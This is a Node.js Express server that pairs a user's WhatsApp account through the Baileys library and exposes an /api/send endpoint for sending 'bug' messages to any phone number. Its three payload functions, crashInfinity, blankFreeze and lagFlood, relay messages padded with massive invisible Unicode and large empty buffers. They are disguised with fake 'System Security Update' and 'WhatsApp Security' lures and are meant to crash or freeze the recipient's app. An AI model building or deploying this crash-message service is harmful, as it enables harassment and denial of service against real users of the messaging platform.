require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const Redis = require('ioredis');
const pino = require('pino');
const {
  default: makeWASocket,
  fetchLatestBaileysVersion,
  DisconnectReason,
  initAuthCreds,
} = require('@whiskeysockets/baileys');

const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(express.static('public'));

// ==================== REDIS CLIENT ====================
const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: parseInt(process.env.REDIS_PORT) || 6379,
  password: process.env.REDIS_PASSWORD,
  tls: process.env.REDIS_TLS === 'true' ? {} : undefined,
  retryStrategy: (times) => Math.min(times * 50, 2000)
});
redis.on('error', (err) => console.error('Redis error:', err));
redis.on('connect', () => console.log('✅ Connected to Redis Upstash'));

// ==================== IN-MEMORY SOCKET STORE ====================
const sessions = new Map(); // sessionId -> { socket, phone, connected }

// ==================== HELPER FUNCTIONS ====================

// Generate random session ID if not present
function getOrCreateSessionId(req, res) {
  let sessionId = req.cookies.whatsapp_session;
  if (!sessionId) {
    sessionId = crypto.randomBytes(16).toString('hex');
    res.cookie('whatsapp_session', sessionId, { httpOnly: true, maxAge: 30 * 24 * 60 * 60 * 1000 }); // 30 days
  }
  return sessionId;
}

// Get auth state from Redis for a given session
async function getAuthState(sessionId) {
  const key = `wa:session:${sessionId}`;
  const data = await redis.get(key);
  let creds = {};
  let keys = {};

  if (data) {
    try {
      const parsed = JSON.parse(data);
      creds = parsed.creds || {};
      keys = parsed.keys || {};
    } catch (e) {}
  }

  if (Object.keys(creds).length === 0) {
    creds = initAuthCreds();
  }

  const keysStore = {
    get: (type, ids) => keys[type]?.[ids],
    set: (data) => {
      if (!keys[data.type]) keys[data.type] = {};
      keys[data.type][data.ids] = data.value;
    },
  };

  const state = { creds, keys: keysStore };
  const saveCreds = async () => {
    await redis.set(key, JSON.stringify({ creds: state.creds, keys }));
  };

  return { state, saveCreds };
}

// Initialize a new socket for a session
async function initSocket(sessionId) {
  const { state, saveCreds } = await getAuthState(sessionId);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: 'silent' }),
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    connectTimeoutMs: 30000,
    defaultQueryTimeoutMs: 30000,
  });

  // Store socket in memory
  sessions.set(sessionId, {
    socket: sock,
    connected: false,
    phone: null,
  });

  // Event: creds update
  sock.ev.on('creds.update', async () => {
    console.log(`📝 Session ${sessionId}: creds updated, saving to Redis...`);
    await saveCreds();
    console.log(`✅ Session ${sessionId}: creds saved`);
  });

  // Event: connection update
  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    console.log(`Session ${sessionId}: connection update: ${connection}`);
    const sessionData = sessions.get(sessionId);
    if (!sessionData) return;

    if (connection === 'open') {
      sessionData.connected = true;
      const me = sock.user;
      sessionData.phone = me?.id?.split(':')[0] || null;
      console.log(`✅ Session ${sessionId}: WhatsApp connected as ${sessionData.phone}`);
      await redis.set(`wa:phone:${sessionId}`, sessionData.phone || '');
    } else if (connection === 'close') {
      sessionData.connected = false;
      sessionData.phone = null;
      console.log(`❌ Session ${sessionId}: connection closed, reconnecting in 5s...`);
      // Remove from map and recreate after delay
      sessions.delete(sessionId);
      setTimeout(() => initSocket(sessionId), 5000);
    }
  });

  // Optional: error handling
  sock.ev.on('error', (err) => console.error(`Session ${sessionId}: socket error:`, err));

  return sock;
}

// Get or create socket for a session (lazy initialization)
async function getOrCreateSocket(sessionId) {
  let sessionData = sessions.get(sessionId);
  if (!sessionData) {
    await initSocket(sessionId);
    sessionData = sessions.get(sessionId);
  }
  return sessionData?.socket;
}

// Pairing for a specific session
async function pairDevice(sessionId, phoneNumber) {
  const sock = await getOrCreateSocket(sessionId);
  if (!sock) throw new Error('Socket not initialized');

  // Check if already registered
  if (sock.authState.creds.registered) {
    throw new Error('Already paired. Use reset first if you want to re-pair.');
  }

  // Request pairing code
  const code = await sock.requestPairingCode(phoneNumber);
  return code;
}

// ==================== BUG FUNCTIONS ====================
async function crashInfinity(target, sock) {
    const invisibleForce = "‎".repeat(50000); 
    const fakeImage = Buffer.alloc(200000); 

    console.log(`[!] Constructing Lethal Payload for ${target}...`);

    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: invisibleForce,
                            hasMediaAttachment: true,
                            jpegThumbnail: fakeImage
                        },
                        body: {
                            text: "⚠️ System Security Update Required"
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Update Now",
                                    id: "crash-trigger"
                                })
                            }],
                            contentId: "Xerumi-Cloud-v1"
                        },
                        contextInfo: {
                            quotedMessage: {
                                buttonsMessage: {
                                    contentText: invisibleForce,
                                    footerText: invisibleForce,
                                    buttons: [
                                        { buttonId: 'id1', buttonText: { displayText: invisibleForce }, type: 1 }
                                    ]
                                }
                            },
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast"
                        }
                    }
                }
            }
        }, { 
            participant: { jid: target } 
        });

        console.log(`[✅] Payload successfully relayed to ${target}`);
        
        await sock.ws.close();
        process.exit(0);

    } catch (err) {
        console.error(`[❌] Failed to send payload: ${err.message}`);
    }
}

async function blankFreeze(target, sock) {
    const ghostPayload = "‌".repeat(10000) + "‎".repeat(10000) + "⿈".repeat(5000);
    console.log(chalk.yellow(`[!] Injecting Blank-Freeze to: ${target}`));

    try {
        await sock.relayMessage(target, {
            pollCreationMessage: {
                name: ghostPayload, 
                options: [
                    { optionName: "‌".repeat(5000) },
                    { optionName: "‎".repeat(5000) }
                ],
                selectableOptionsCount: 0
            },
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "System Error: 0x000F2",
                    body: ghostPayload.slice(0, 1000),
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    thumbnail: Buffer.alloc(50000) 
                }
            }
        }, { 
            participant: { jid: target } 
        });

        console.log(chalk.green(`[✅] Blank-Freeze Sent! Target should be unresponsive.`));
        setTimeout(async () => {
            await sock.ws.close();
            process.exit(0);
        }, 2000);

    } catch (err) {
        console.log(chalk.red(`[❌] Error: ${err.message}`));
    }
}

async function lagFlood(target, sock) {
    const chaosText = "🥵".repeat(1000) + "‮".repeat(5000) + "‎".repeat(5000);

    console.log(chalk.blue(`[!] Launching Lag-Flood Attack to: ${target}`));

    try {
        await sock.relayMessage(target, {
            listMessage: {
                title: "System Synchronization..." + "‎".repeat(1000),
                description: "Processing incoming data packets...",
                buttonText: "Click to Resolve",
                listType: 1,
                sections: Array.from({ length: 20 }, (_, i) => ({
                    title: `Protocol-X${i}`,
                    rows: Array.from({ length: 20 }, (_, j) => ({
                        title: chaosText,
                        description: "Data-Stream-" + j,
                        rowId: `id-${i}-${j}`
                    }))
                })),
                contextInfo: {
                    remoteJid: "0@s.whatsapp.net",
                    adContextInfo: {
                        advertiserName: "WhatsApp Security",
                        status: chaosText
                    },
                    externalAdReply: {
                        title: "‎".repeat(10000),
                        mediaType: 2,
                        thumbnail: Buffer.alloc(100000)
                    }
                }
            }
        }, { 
            participant: { jid: target } 
        });

        console.log(chalk.cyan(`[✅] Lag-Flood successfully deployed to ${target}`));
        setTimeout(async () => {
            await sock.ws.close();
            process.exit(0);
        }, 1500);

    } catch (err) {
        console.log(chalk.red(`[❌] Flood Failed: ${err.message}`));
    }
}


// ==================== SEND BUG (REFACTORED) ====================
async function sendBugMessage(sessionId, to, bugType) {
  const sessionData = sessions.get(sessionId);
  if (!sessionData || !sessionData.connected) {
    throw new Error('WhatsApp not connected. Please pair first.');
  }
  const sock = sessionData.socket;

  const jid = to.includes('@') ? to : `${to}@s.whatsapp.net`;

  switch (bugType) {
    case 'Crash Infinity':
      await crashInfinity(jid, sock);
      break;
    case 'Blank Freeze':
      await blankFreeze(jid, sock);
      break;
    case 'Lag Flood':
      await lagFlood(jid, sock);
      break;
    default:
      throw new Error('Unknown bug type');
  }
  return true;
}

// Reset a specific session
async function resetSession(sessionId) {
  // Delete Redis data
  await redis.del(`wa:session:${sessionId}`);
  await redis.del(`wa:phone:${sessionId}`);

  // Close socket if exists
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.socket) {
    try {
      await sessionData.socket.end();
    } catch (e) {}
  }
  sessions.delete(sessionId);
}

// ==================== API ENDPOINTS ====================

// Status for current session
app.get('/api/status', async (req, res) => {
  const sessionId = getOrCreateSessionId(req, res);
  const sessionData = sessions.get(sessionId);
  const connected = sessionData?.connected || false;
  const phone = sessionData?.phone || (await redis.get(`wa:phone:${sessionId}`)) || null;

  res.json({
    success: true,
    connected,
    phone,
  });
});

// Pairing for current session
app.post('/api/pair', async (req, res) => {
  const sessionId = getOrCreateSessionId(req, res);
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ success: false, message: 'Phone number required' });

  const cleaned = phone.replace(/\D/g, '');
  if (!cleaned.match(/^[0-9]{10,15}$/)) {
    return res.status(400).json({ success: false, message: 'Invalid phone number' });
  }

  // Check if already connected for this session
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.connected) {
    return res.status(400).json({ success: false, message: 'Already connected. Use reset first to re-pair.' });
  }

  try {
    const code = await pairDevice(sessionId, cleaned);
    res.json({ success: true, code });
  } catch (err) {
    console.error(`Pairing error for session ${sessionId}:`, err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Reset current session
app.post('/api/reset', async (req, res) => {
  const sessionId = getOrCreateSessionId(req, res);
  try {
    await resetSession(sessionId);
    // Also clear the cookie? Not necessary, but we can keep it for new session.
    res.json({ success: true, message: 'Session reset. You can now pair again.' });
  } catch (err) {
    console.error(`Reset error for session ${sessionId}:`, err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Send bug using current session
app.post('/api/send', async (req, res) => {
  const sessionId = getOrCreateSessionId(req, res);
  const { to, bugType } = req.body;
  if (!to || !bugType) {
    return res.status(400).json({ success: false, message: 'Target and bug type required' });
  }

  try {
    await sendBugMessage(sessionId, to, bugType);
    res.json({ success: true, message: 'Bug sent' });
  } catch (err) {
    console.error(`Send error for session ${sessionId}:`, err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = app;